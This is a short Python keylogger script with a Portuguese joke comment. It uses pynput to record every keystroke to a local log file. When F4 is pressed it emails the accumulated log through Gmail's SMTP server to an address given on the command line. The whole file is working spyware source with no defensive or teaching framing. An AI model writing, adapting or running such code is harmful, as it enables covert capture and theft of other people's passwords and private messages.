# escrevi isso bêbabo, foda-se...
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

# cancel script if pressed esc
def cancel():
  exit()

# send email
def send_email():

  #read file
  f = open("log.txt", "r")

  # create message object
  msg = MIMEMultipart()

  # read file log
  message = f.read()

  # setup the parameters of the message
  password = arg[2]
  msg['From'] = arg[1]
  msg['To'] = arg[3]
  msg['Subject'] = 'log information'

  # add in the message body
  msg.attach(MIMEText(message, 'plain'))


  #create server
  server = smtplib.SMTP('smtp.gmail.com: 587')

  server.starttls()

  # Login Credentials for sending the mail
  server.login(msg['From'], password)

  # send the message
  server.sendmail(msg['From'], msg['To'], msg.as_string())

  server.quit()

  print("Email sended to:", arg[3])

# start keylogger
def write_log(key):
  keydata = str(key)

  # verify keys
  if keydata == "Key.esc":
    cancel()
  elif keydata == "Key.f4":
    send_email()

  # translate keys for log file
  translate_keys = {
        "Key.space": " ",
        "Key.backspace": "-1",
        "Key.ctrl_l": "",
        "Key.ctrl_r": "",
        "Key.shift": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.tab": "",
        "_l": ""
  }

  # remove quotes
  keydata = keydata.replace("'", "")

  # replaces with the translated information
  for key in translate_keys:
    keydata = keydata.replace(key, translate_keys[key])

  # create file with log information
  with open("log.txt", "a") as f:
    f.write(keydata)

# receive arguments
arg = sys.argv

# start write log
with Listener(on_press=write_log) as l:
  l.join()
